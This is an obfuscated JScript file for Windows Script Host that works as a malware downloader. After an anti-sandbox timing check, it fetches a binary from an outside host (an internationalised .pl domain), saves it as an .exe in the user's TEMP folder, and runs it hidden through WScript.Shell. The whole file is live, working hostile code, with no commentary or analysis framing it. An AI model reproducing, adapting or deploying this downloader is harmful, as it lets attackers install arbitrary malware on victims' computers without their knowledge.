var Z1 = false;
var J = "Create"+"Object";
var FD = function Q() {return WScript[J]("WScript"+".Shell");}(), K0 = 11;
var DM = "MSXML2"+".XMLHTTP";
var Z0 = 2;
var EM = Z0 - 2;
function Y(W){FD["Run"](W, EM, EM);};
function Z(){return DM + "";};
function G(IT, W0){EM = EM * 1; return IT - W0;};
function KE(){return J;};
/*@cc_on
  @if (@_win32 || @_win64)
    Z1 = true;
  @end
@*/
if (Z1)
{
var Q0 = "";
function X(){return 22;};
var L0 = 0; var H = 0;
function M()
{
var OE = new this["Date"]();
var G0 = OE["getUTCMilliseconds"]();
WScript["Sleep"](X());
var OE = new this["Date"]();
var L = OE["getUTCMilliseconds"]();
WScript["Sleep"](X());
var OE = new this["Date"]();
var KP = OE["getUTCMilliseconds"]();
var L0 = "CJ";
L0 = G(L, G0);
var H = "HI";
H = G(KP, L);
Q0 = "open";
return G(L0, H);
}
var F = false;
var M0 = false;
for (var RM = EM; RM < X() * 1; RM++){if (M() != EM){
F = true; 
H = "31" + 11 * L0 + H; 
M0 = true; 
break;
}}
function E() {return ((F == true) && (F == M0)) ? 1 : EM;};
if (F && E() && M0){
function NG() {return FD["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "xQtZxwPX4HVo.ex" + "e";};
 B = Z();
 C = WScript[J](B);
 var JK = 1;
do { 
	for (;JK;){
	try {
		if (JK == 1)
		{
			C[Q0]("GET", "http://xn--po-wqa.pl/a8zkde", false);
			C["send"]();
			D = "Sleep";
			JK = 2;
		}
		WScript[D](X() + 120); 
		if (C["readystate"] < 2 * 2) continue;
		JK = EM;
		function K(O) {var CY = (1, 2, 3, 4, 5, O); return CY;};
		KV = WScript[KE()]("ADODB.Stream");
		B = KV;
		B[Q0]();
		B["type"] = K(1);
		B["write"](C["ResponseBody"]);
		KV["position"] = K(EM);
		B["Save" + "ToFile"](NG(), 2);
		KV["cl"+"ose"]();
		T = NG();
		Y(T);
	} catch(P){};};
}while (JK);
}
}

